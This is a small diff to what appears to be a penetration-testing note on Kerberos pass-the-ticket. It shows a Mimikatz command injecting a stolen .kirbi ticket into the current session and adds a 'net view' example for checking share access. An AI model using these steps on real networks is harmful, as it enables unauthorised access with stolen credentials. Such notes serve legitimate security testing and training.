@@ -16,3 +16,8 @@ dir *.kirbi
 kerberos::ptt $(KIRBI_FILENAME)
 ```
 Now there will be the permissions of the ticket enabled on the current session and user. (i.e. if the user who's ticket was taken from cache is able to access a share, you can too!)
+### Example:
+Now that the share is accessible in the session, try the following:
+```batch
+net view \\web04
+```
